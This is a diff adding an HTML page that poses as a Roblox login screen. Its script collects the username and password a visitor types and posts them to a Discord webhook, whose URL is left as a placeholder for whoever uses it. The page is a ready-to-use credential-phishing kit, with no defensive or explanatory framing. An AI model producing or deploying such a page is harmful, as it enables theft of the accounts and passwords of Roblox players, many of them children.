@@ -1,0 +1,49 @@
+html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Login</title>
+</head>
+<body>
+    <h1>Welcome to Roblox!</h1>
+    <p>Please enter your username and password to log in:</p>
+    <form id="loginForm">
+        Username: <input type="text" id="username"><br>
+        Password: <input type="password" id="password"><br>
+        <button type="submit" onclick="sendToWebhook()">Login</button>
+    </form>
+
+    <script>
+        function sendToWebhook() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const payload = {
+                username: username,
+                password: password,
+                roblosecurity: true
+            };
+
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Data sent to Discord webhook successfully');
+                } else {
+                    console.error('Error sending data to Discord webhook');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending data to Discord webhook:', error);
+            });
+        }
+    </script>
+</body>
+</html>
